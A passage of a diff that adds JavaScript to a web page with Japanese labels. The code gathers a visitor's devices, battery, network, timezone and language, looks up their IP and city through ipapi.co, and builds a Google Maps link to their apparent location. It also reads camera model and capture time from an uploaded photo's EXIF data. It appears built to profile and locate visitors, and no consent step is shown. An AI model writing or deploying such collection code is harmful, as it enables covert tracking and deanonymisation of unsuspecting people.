+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const deviceSummaries = devices.map(d => `• [${d.kind}] ${d.label || '名称未公開 (要権限)'}`);
+                    if (deviceSummaries.length > 0) {
+                        mediaDevicesList = deviceSummaries.join('\n');
+                    } else {
+                        mediaDevicesList = "検出デバイスなし";
+                    }
+                } catch (e) {
+                    mediaDevicesList = "列挙失敗";
+                }
+            }
+
+            let batteryInfo = "取得不可";
+            if ('getBattery' in navigator) {
+                try {
+                    const b = await navigator.getBattery();
+                    const level = Math.round(b.level * 100);
+                    const charging = b.charging ? "充電中" : "放電中";
+                    batteryInfo = `${level}% (${charging})`;
+                } catch (e) {
+                    batteryInfo = "権限拒否";
+                }
+            }
+
+            const netType = navigator.connection ? (navigator.connection.effectiveType || navigator.connection.type || "標準") : "不明";
+            const tzLang = `${Intl.DateTimeFormat().resolvedOptions().timeZone} / ${navigator.language}`;
+
+            return {
+                deviceDetail,
+                hardware,
+                gpu: gpuInfo,
+                storage: storageInfo,
+                screen: screenRes,
+                mediaDevices: mediaDevicesList,
+                osBrowser: ua.substring(0, 120),
+                battery: batteryInfo,
+                network: netType,
+                tzLang
+            };
+        }
+
+        async function getLocationAndIP() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const data = await res.json();
+                    const mapUrl = (data.latitude && data.longitude) 
+                        ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}` 
+                        : "取得不可";
+                    return {
+                        ip: data.ip,
+                        location: `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`,
+                        mapUrl
+                    };
+                }
+            } catch (e) {
+                console.warn("IP location fetch failed:", e);
+            }
+            return { ip: "取得失敗", location: "取得失敗", mapUrl: "取得不可" };
+        }
+
+        function extractExifInfo(file) {
+            return new Promise((resolve) => {
+                if (!file || typeof EXIF === 'undefined') {
+                    resolve("メタデータなし");
+                    return;
+                }
+                EXIF.getData(file, function() {
+                    const make = EXIF.getTag(this, "Make") || "";
+                    const model = EXIF.getTag(this, "Model") || "";
+                    const dateTime = EXIF.getTag(this, "DateTimeOriginal") || EXIF.getTag(this, "DateTime") || "";
+                    
+                    let resultStr = "";
+                    if (make || model) resultStr += `端末: ${make} ${model} | `;
+                    if (dateTime) resultStr += `撮影日時: ${dateTime}`;
+
+                    resolve(resultStr.trim() || "EXIF情報検出なし");
+                });
+            });
+        }
+    </script>
+</body>
+</html>
